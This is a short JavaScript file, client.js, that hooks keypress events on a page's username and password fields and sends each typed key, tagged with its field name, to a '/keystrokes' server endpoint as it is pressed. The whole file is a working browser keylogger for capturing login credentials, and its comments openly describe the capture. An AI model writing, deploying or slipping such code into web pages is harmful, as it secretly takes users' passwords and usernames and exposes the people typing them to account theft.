// client.js
document.addEventListener("DOMContentLoaded", function () {
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
  
    // Event listener to capture keypress events on username input field
    usernameInput.addEventListener("keypress", function (event) {
      const key = event.key;
      const fieldName = "username";
  
      // Send captured keystrokes to the server
      sendKeystrokeToServer(key, fieldName);
    });
  
    // Event listener to capture keypress events on password input field
    passwordInput.addEventListener("keypress", function (event) {
      const key = event.key;
      const fieldName = "password";
  
      // Send captured keystrokes to the server
      sendKeystrokeToServer(key, fieldName);
    });
  
    // Function to send keystrokes to the server
    function sendKeystrokeToServer(key, fieldName) {
      fetch("/keystrokes", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ key, fieldName }),
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.text();
      })
      .then(data => console.log(data))
      .catch(error => console.error('There was a problem with your fetch operation:', error));
    }
  });
  